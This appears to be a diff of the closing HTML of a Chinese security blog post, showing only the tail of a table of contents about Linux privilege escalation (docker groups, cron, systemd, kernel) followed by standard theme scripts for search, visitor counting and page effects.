class="nav-text">利用docker组提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用LXC-LXD-组提权"><span class="nav-number">11.</span> <span class="nav-text">利用LXC/LXD 组提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#计划任务"><span class="nav-number">12.</span> <span class="nav-text">计划任务</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cron"><span class="nav-number">12.1.</span> <span class="nav-text">Cron</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通配符"><span class="nav-number">12.2.</span> <span class="nav-text">通配符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权演示-3"><span class="nav-number">12.3.</span> <span class="nav-text">提权演示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#system配置"><span class="nav-number">13.</span> <span class="nav-text">system配置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#systemd简介"><span class="nav-number">13.1.</span> <span class="nav-text">systemd简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权演示-4"><span class="nav-number">13.2.</span> <span class="nav-text">提权演示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#内核提权"><span class="nav-number">14.</span> <span class="nav-text">内核提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充："><span class="nav-number">15.</span> <span class="nav-text">补充：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cyzCc</span>
+
+ <!-- 
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">150.4k</span>
+  
+
+</div>
+
+-->
+
+
+
+
+
+
+<!-- 新增访客统计代码 -->
+<!--<div class="busuanzi-count">
+    <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+      博客全站共： <span class="post-count">150.4k</span> 字
+    </span>
+	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
+</div>
+<!-- 新增访客统计代码 END-->
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("TSaUMM9qwI423iWuECxQWDDh-gzGzoHsz", "2DucY6TQAx8iNNnjFYelMbXV");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+  
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<div class="bg_content">
+<canvas id="canvas"></canvas>
+</div>
+<!-- 雪花特效 -->
+<!--<script type="text/javascript">
+
+    document.write('<script type="text/javascript" src="/js/src/snow2.js"><\/script>');
+
+</script>-->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
